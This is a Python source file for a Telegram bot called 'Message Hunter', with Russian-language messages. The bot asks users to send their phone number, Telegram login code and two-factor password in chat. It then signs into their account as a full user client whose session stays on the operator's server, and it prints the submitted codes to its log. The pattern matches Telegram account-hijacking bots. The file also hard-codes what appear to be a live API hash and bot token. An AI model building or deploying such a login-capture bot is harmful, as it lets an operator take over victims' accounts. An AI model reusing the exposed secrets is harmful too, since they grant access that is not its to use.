from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import json
import asyncio
import time

# API данные
API_ID = 29318340
API_HASH = "68be30e447857e5e5aa24c23a41c686d"
BOT_TOKEN = "8083238823:AAHgAcvKL7nf29zz66kGB3bL6QCSHOVXCRA"

# Создаём бота
bot_app = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Состояния пользователей
user_states = {}
user_clients = {}
temp_auth_data = {}

def save_user_session(user_id, session_data):
    """Сохраняет сессию пользователя"""
    try:
        os.makedirs('user_sessions', exist_ok=True)
        with open(f'user_sessions/{user_id}.json', 'w', encoding='utf-8') as f:
            json.dump(session_data, f, ensure_ascii=False, indent=2)
        print(f"✅ Сессия сохранена для {user_id}")
            
    except Exception as e:
        print(f"❌ Ошибка сохранения сессии: {e}")

@bot_app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    
    print(f"🤖 Получена команда /start от пользователя {user_id}")
    
    # Проверяем есть ли параметр
    if len(message.command) > 1:
        param = message.command[1]
        
        if param == 'web_auth':
            # Веб-авторизация
            print(f"🌐 Веб-авторизация от пользователя {user_id}")
            
            user_states[user_id] = {
                'web_user_id': f'web_{user_id}',
                'step': 'waiting_phone'
            }
            
            await message.reply_text(
                "🌐 **Веб-авторизация Message Hunter**\n\n"
                "📱 Отправьте ваш номер телефона в формате:\n"
                "`+380991234567`\n\n"
                "После авторизации вернитесь в браузер и нажмите 'Проверить авторизацию'"
            )
        else:
            # Обычная авторизация через веб-интерфейс
            await start_auth_process(message, user_id, param)
    else:
        # Обычный старт
        await message.reply_text(
            "🔍 **Message Hunter Bot**\n\n"
            "Этот бот используется для подключения аккаунта к веб-приложению.\n\n"
            "Для начала работы:\n"
            "• Перейдите на сайт\n"
            "• Или отправьте /start для авторизации"
        )

@bot_app.on_message(filters.text & filters.private & ~filters.command("start"))
async def handle_text(client, message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    print(f"📝 Получен текст от {user_id}: {text}")
    print(f"🔍 Активные состояния: {list(user_states.keys())}")
    
    if user_id not in user_states:
        await message.reply_text(
            "❌ Нет активного процесса авторизации.\n\n"
            f"🔍 **Отладочная информация:**\n"
            f"Ваш ID: `{user_id}`\n"
            f"Активные сессии: {len(user_states)}\n\n"
            f"Получите новую ссылку на сайте или нажмите /start"
        )
        return
    
    user_data = user_states[user_id]
    print(f"📊 Состояние пользователя {user_id}: {user_data}")
    
    if user_data['step'] == 'waiting_phone':
        await handle_phone_input(client, message, user_id, text, user_data)
    elif user_data['step'] == 'waiting_code':
        await handle_code_input(client, message, user_id, text, user_data)
    elif user_data['step'] == 'waiting_2fa':
        await handle_2fa_input(client, message, user_id, text, user_data)

async def handle_phone_input(client, message, user_id, phone, user_data):
    """Обработка ввода номера телефона"""
    if not (phone.startswith('+') and len(phone) >= 10):
        await message.reply_text("❌ Неверный формат. Используйте: `+380991234567`")
        return
    
    try:
        print(f"📱 Отправляем код на номер: {phone}")
        
        # Создаем клиент для пользователя
        session_name = f"user_session_{user_data['web_user_id']}"
        user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        
        await user_client.connect()
        sent_code = await user_client.send_code(phone)
        
        # Сохраняем данные
        user_clients[user_id] = user_client
        temp_auth_data[user_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash
        }
        
        user_states[user_id]['step'] = 'waiting_code'
        
        print(f"✅ Код отправлен на {phone}")
        
        await message.reply_text(
            f"📨 **Код отправлен на {phone}**\n\n"
            f"⏱️ Введите 5-значный код из SMS:\n"
            f"Например: `12345`"
        )
        
    except Exception as e:
        print(f"❌ Ошибка отправки кода: {e}")
        await message.reply_text(f"❌ Ошибка отправки кода: {str(e)}")

async def handle_code_input(client, message, user_id, code, user_data):
    """Обработка ввода SMS кода"""
    if not (code.isdigit() and len(code) == 5):
        await message.reply_text("❌ Введите 5-значный код (только цифры)")
        return
    
    try:
        print(f"🔐 Проверяем код: {code}")
        
        auth_data = temp_auth_data[user_id]
        user_client = user_clients[user_id]
        
        # Авторизуемся
        await user_client.sign_in(
            auth_data['phone'], 
            auth_data['phone_code_hash'], 
            code
        )
        
        # Получаем информацию о пользователе
        me = await user_client.get_me()
        await user_client.disconnect()
        
        # Сохраняем сессию
        session_data = {
            'is_connected': True,
            'phone': auth_data['phone'],
            'user_info': {
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'user_id': str(me.id)
            }
        }
        
        save_user_session(user_data['web_user_id'], session_data)
        
        # Очищаем временные данные
        cleanup_user_data(user_id)
        
        print(f"✅ Авторизация завершена для {me.first_name}")
        
        await message.reply_text(
            f"✅ **Аккаунт успешно подключен!**\n\n"
            f"👤 Пользователь: {me.first_name}\n"
            f"📱 Телефон: {auth_data['phone']}\n\n"
            f"Теперь вернитесь на сайт и нажмите **'Проверить подключение'**"
        )
        
    except Exception as e:
        error_str = str(e)
        print(f"❌ Ошибка авторизации: {error_str}")
        
        if "SESSION_PASSWORD_NEEDED" in error_str:
            user_states[user_id]['step'] = 'waiting_2fa'
            await message.reply_text(
                "🔐 **Требуется пароль двухфакторной аутентификации**\n\n"
                "Введите ваш пароль 2FA:"
            )
        elif "PHONE_CODE_EXPIRED" in error_str:
            cleanup_user_data(user_id)
            await message.reply_text("⏰ Код истек. Начните заново - получите новую ссылку на сайте")
        elif "PHONE_CODE_INVALID" in error_str:
            await message.reply_text("❌ Неверный код. Попробуйте еще раз")
        else:
            await message.reply_text(f"❌ Ошибка: {error_str}")

async def handle_2fa_input(client, message, user_id, password, user_data):
    """Обработка пароля 2FA"""
    try:
        print(f"🔐 Проверяем пароль 2FA")
        
        user_client = user_clients[user_id]
        await user_client.check_password(password)
        
        me = await user_client.get_me()
        await user_client.disconnect()
        
        session_data = {
            'is_connected': True,
            'phone': temp_auth_data[user_id]['phone'],
            'user_info': {
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'user_id': str(me.id)
            }
        }
        
        save_user_session(user_data['web_user_id'], session_data)
        cleanup_user_data(user_id)
        
        print(f"✅ Авторизация с 2FA завершена для {me.first_name}")
        
        await message.reply_text(
            f"✅ **Аккаунт успешно подключен!**\n\n"
            f"👤 Пользователь: {me.first_name}\n\n"
            f"Теперь вернитесь на сайт и нажмите **'Проверить подключение'**"
        )
        
    except Exception as e:
        print(f"❌ Ошибка 2FA: {e}")
        await message.reply_text(f"❌ Неверный пароль 2FA. Попробуйте еще раз")

def cleanup_user_data(user_id):
    """Очистка временных данных пользователя"""
    try:
        if user_id in user_states:
            del user_states[user_id]
        if user_id in temp_auth_data:
            del temp_auth_data[user_id]
        if user_id in user_clients:
            del user_clients[user_id]
        print(f"🧹 Очищены данные для пользователя {user_id}")
    except Exception as e:
        print(f"❌ Ошибка очистки данных: {e}")

if __name__ == "__main__":
    print("🤖 Основной бот запускается...")
    print("🔗 Бот готов принимать команды...")
    bot_app.run()